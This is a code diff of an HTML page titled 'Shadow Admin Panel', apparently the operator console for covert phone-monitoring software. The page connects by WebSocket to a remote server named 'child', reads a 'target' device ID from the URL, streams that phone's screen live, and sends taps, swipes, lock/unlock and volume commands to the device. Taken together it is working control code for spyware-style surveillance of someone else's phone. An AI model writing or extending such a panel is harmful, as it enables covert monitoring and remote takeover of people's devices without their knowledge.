@@ -2,127 +2,193 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Remote Screen Control</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Shadow Admin Panel</title>
+    
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+
     <style>
-        :root { --accent: #00ff88; --danger: #ff3333; --panel-bg: #1a1a1a; }
-        body { margin: 0; background: #000; color: white; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-
-        .top-nav { padding: 15px; display: flex; justify-content: space-between; background: var(--panel-bg); border-bottom: 1px solid #333; }
-        .screen-container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative; }
-
-        .phone-frame {
-            width: 300px; height: 600px; border: 8px solid #333; border-radius: 40px;
-            background: #050505; position: relative; box-shadow: 0 0 50px rgba(0, 255, 136, 0.1);
-            overflow: hidden; display: flex; align-items: center; justify-content: center;
+        :root {
+            --bg-color: #050505;
+            --panel-bg: #1a1a1a;
+            --accent: #00ff88;
+            --danger: #ff3333;
+            --text-main: #ffffff;
         }
 
-        #screenStream { width: 100%; height: 100%; object-fit: contain; display: none; }
-        .placeholder-text { color: #444; text-align: center; font-size: 0.9rem; }
+        body {
+            margin: 0; background-color: var(--bg-color); color: var(--text-main);
+            font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden;
+        }
 
+        /* --- Header --- */
+        .top-nav {
+            padding: 15px 20px; background: var(--panel-bg); border-bottom: 1px solid #333;
+            display: flex; justify-content: space-between; align-items: center; z-index: 10;
+        }
+        .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; }
+        .status-badge { font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
+        .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; box-shadow: 0 0 5px var(--danger); }
+        .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }
+
+        /* --- Main Layout --- */
+        .screen-container {
+            flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative;
+        }
+
+        /* --- Phone Frame --- */
+        .phone-frame {
+            width: 300px; height: 600px; border: 8px solid #222; border-radius: 30px;
+            background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
+            overflow: hidden; display: flex; align-items: center; justify-content: center;
+        }
+        #screenStream { width: 100%; height: 100%; object-fit: contain; }
+        
+        .offline-msg { position: absolute; color: #444; text-align: center; display: flex; flex-direction: column; align-items: center; }
+
+        /* --- Controls --- */
+        .side-panel {
+            position: absolute; right: 30px; display: flex; flex-direction: column; gap: 15px;
+            background: rgba(26, 26, 26, 0.8); padding: 15px; border-radius: 20px; border: 1px solid #333;
+        }
+        .control-btn {
+            width: 50px; height: 50px; border-radius: 50%; background: #2a2a2a; border: 1px solid #444;
+            color: white; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; font-size: 1.2rem;
+        }
+        .control-btn:hover { border-color: var(--accent); color: var(--accent); transform: scale(1.1); }
+        .control-btn:active { transform: scale(0.9); }
+
+        /* Navigation Bar (Bottom of Phone) */
         .nav-bar {
             width: 100%; height: 50px; background: rgba(0, 0, 0, 0.8);
             position: absolute; bottom: 0; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #222;
         }
-        .nav-item { color: #666; font-size: 1.2rem; cursor: pointer; transition: 0.3s; }
-        .nav-item:hover { color: var(--accent); }
+        .nav-item { color: #666; font-size: 1.2rem; cursor: pointer; padding: 10px; }
+        .nav-item:hover { color: white; }
 
-        .side-panel { position: absolute; right: 20px; display: flex; flex-direction: column; gap: 15px; }
-        .control-btn {
-            width: 50px; height: 50px; border-radius: 50%; background: var(--panel-bg);
-            border: 1px solid #333; color: white; display: flex; align-items: center; justify-content: center;
-            cursor: pointer; transition: 0.3s;
+        @media (max-width: 768px) {
+            .screen-container { flex-direction: column; }
+            .side-panel { position: relative; right: auto; flex-direction: row; margin-top: 20px; flex-wrap: wrap; justify-content: center; width: 100%; max-width: 300px; }
+            .phone-frame { width: 100%; max-width: 320px; height: auto; aspect-ratio: 9/19; }
         }
-        .control-btn:hover { border-color: var(--accent); color: var(--accent); }
-        .btn-red:hover { border-color: var(--danger); color: var(--danger); }
-        
-        .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; display: inline-block; margin-right: 5px; }
-        .active-dot { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }
     </style>
 </head>
 <body>
 
     <div class="top-nav">
-        <a href="index.html" style="color:white; text-decoration:none;"><i class="fa-solid fa-arrow-left"></i> Remote Screen</a>
-        <div id="status"><span class="live-dot" id="dot"></span> Status: <span id="statusText" style="color:var(--danger)">Offline</span></div>
+        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW</div>
+        <div class="status-badge">
+            <span class="live-dot" id="dot"></span> 
+            <span id="statusText" style="color:#888">Initializing...</span>
+        </div>
     </div>
 
     <div class="screen-container">
+        
         <div class="phone-frame">
-            <div id="loader" class="placeholder-text">
-                <i class="fa-solid fa-display fa-3x"></i><br><br>
-                Click Play to start Monitoring
+            <div id="offlineMsg" class="offline-msg">
+                <i class="fa-solid fa-spinner fa-spin fa-2x"></i>
+                <p style="margin-top:10px" id="msgText">Waiting for connection...</p>
             </div>
-            <img id="screenStream" src="" alt="Live Stream">
-
+            <img id="screenStream" src="" alt="" onclick="sendClick(event)">
+            
             <div class="nav-bar">
-                <div class="nav-item" onclick="sendRemote('key_recent')"><i class="fa-solid fa-square"></i></div>
-                <div class="nav-item" onclick="sendRemote('key_home')"><i class="fa-solid fa-circle"></i></div>
-                <div class="nav-item" onclick="sendRemote('key_back')"><i class="fa-solid fa-caret-left" style="font-size:1.8rem"></i></div>
+                <div class="nav-item" onclick="sendCommand('recent')"><i class="fa-regular fa-square"></i></div>
+                <div class="nav-item" onclick="sendCommand('home')"><i class="fa-regular fa-circle"></i></div>
+                <div class="nav-item" onclick="sendCommand('back')"><i class="fa-solid fa-caret-left" style="font-size:1.5rem"></i></div>
             </div>
         </div>
 
         <div class="side-panel">
-            <div class="control-btn" id="playBtn" onclick="startScreen()" title="Start Casting"><i class="fa-solid fa-play"></i></div>
-            <div class="control-btn" onclick="sendRemote('volume_up')" title="Volume Up"><i class="fa-solid fa-volume-high"></i></div>
-            <div class="control-btn" onclick="sendRemote('volume_down')" title="Volume Down"><i class="fa-solid fa-volume-low"></i></div>
-            <div class="control-btn" onclick="sendRemote('lock_screen')" title="Lock Phone"><i class="fa-solid fa-lock"></i></div>
-            <div class="control-btn btn-red" onclick="stopScreen()" title="Stop Casting"><i class="fa-solid fa-stop"></i></div>
+            <div class="control-btn" onclick="sendCommand('lock')" title="Lock Screen"><i class="fa-solid fa-lock"></i></div>
+            <div class="control-btn" onclick="sendCommand('unlock')" title="Wake Screen"><i class="fa-solid fa-lock-open"></i></div>
+            <div class="control-btn" onclick="sendCommand('volume_up')" title="Vol +"><i class="fa-solid fa-plus"></i></div>
+            <div class="control-btn" onclick="sendCommand('volume_down')" title="Vol -"><i class="fa-solid fa-minus"></i></div>
+            <div class="control-btn" onclick="sendCommand('swipe_up')" title="Swipe Up"><i class="fa-solid fa-arrow-up"></i></div>
+            <div class="control-btn" onclick="sendCommand('swipe_down')" title="Swipe Down"><i class="fa-solid fa-arrow-down"></i></div>
         </div>
+
     </div>
 
     <script>
-        const RENDER_URL = "https://child-v9no.onrender.com";
-        const DEVICE_ID = "M2103K19I";
-        let streamInterval;
+        const SERVER_URL = "https://child-v9no.onrender.com"; 
+        let socket;
+        let currentDeviceId = null;
 
-        async function startScreen() {
-            // 1. Phone ko command bhejo ki screen capture shuru kare
-            const success = await sendRemote('start_screen');
-            
-            if(success) {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('screenStream').style.display = 'block';
-                document.getElementById('statusText').innerText = 'Live';
-                document.getElementById('statusText').style.color = 'var(--accent)';
-                document.getElementById('dot').classList.add('active-dot');
+        // 🔥 AUTOMATIC ID DETECTION (URL SE LEGA)
+        window.onload = function() {
+            // URL se 'id' parameter nikalo (Example: index.html?id=12345)
+            const urlParams = new URLSearchParams(window.location.search);
+            currentDeviceId = urlParams.get('id');
+
+            if (currentDeviceId) {
+                // ID mil gayi! Direct connect karo
+                document.getElementById('statusText').innerText = "Target: " + currentDeviceId;
+                connectSocket();
+            } else {
+                // ID nahi mili URL mai
+                document.getElementById('statusText').innerText = "No ID Found";
+                document.getElementById('msgText').innerText = "Error: No Device ID in Link";
+                document.getElementById('statusText').style.color = "var(--danger)";
+            }
+        };
+
+        function connectSocket() {
+            socket = io(SERVER_URL, { transports: ['websocket'] });
+
+            socket.on("connect", () => {
+                document.getElementById('statusText').innerText = "Connected: " + currentDeviceId;
+                document.getElementById('statusText').style.color = "var(--accent)";
+                document.getElementById('dot').classList.add("active");
                 
-                // 2. Har 2 second mein image refresh karo
-                streamInterval = setInterval(refreshScreen, 2000);
-            }
+                socket.emit("join", "admin_monitor");
+            });
+
+            socket.on("disconnect", () => {
+                document.getElementById('statusText').innerText = "Offline";
+                document.getElementById('statusText').style.color = "var(--danger)";
+                document.getElementById('dot').classList.remove("active");
+                document.getElementById('offlineMsg').style.display = "flex";
+            });
+
+            // Receive Screen Data
+            socket.on("screen-data", (data) => {
+                if (data.room === currentDeviceId) {
+                    document.getElementById('offlineMsg').style.display = "none";
+                    document.getElementById('screenStream').src = "data:image/jpeg;base64," + data.image;
+                }
+            });
         }
 
-        function refreshScreen() {
-            const img = document.getElementById('screenStream');
-            // Timestamp (?t=) lagane se browser purani image cache nahi karta, hamesha nayi mangta hai
-            img.src = `${RENDER_URL}/api/get-data/${DEVICE_ID}/screen.jpg?t=${new Date().getTime()}`;
-        }
-
-        async function stopScreen() {
-            clearInterval(streamInterval);
-            await sendRemote('stop_screen');
+        // Send Commands
+        function sendCommand(action) {
+            if(!socket || !currentDeviceId) return;
+            navigator.vibrate(50);
             
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('screenStream').style.display = 'none';
-            document.getElementById('statusText').innerText = 'Offline';
-            document.getElementById('statusText').style.color = 'var(--danger)';
-            document.getElementById('dot').classList.remove('active-dot');
+            socket.emit("control-event", {
+                room: currentDeviceId,
+                action: action,
+                x: 0, y: 0
+            });
         }
 
-        async function sendRemote(action) {
-            console.log("Sending: " + action);
-            try {
-                const response = await fetch(`${RENDER_URL}/api/send-command`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ device_id: DEVICE_ID, command: action })
-                });
-                return response.ok;
-            } catch (e) {
-                console.error("Failed to send command");
-                return false;
-            }
+        // Send Click
+        function sendClick(event) {
+            if(!socket || !currentDeviceId) return;
+            
+            const img = document.getElementById('screenStream');
+            const rect = img.getBoundingClientRect();
+            
+            const x = Math.round(event.clientX - rect.left);
+            const y = Math.round(event.clientY - rect.top);
+
+            socket.emit("control-event", {
+                room: currentDeviceId,
+                action: "click",
+                x: x,
+                y: y
+            });
         }
     </script>
 </body>
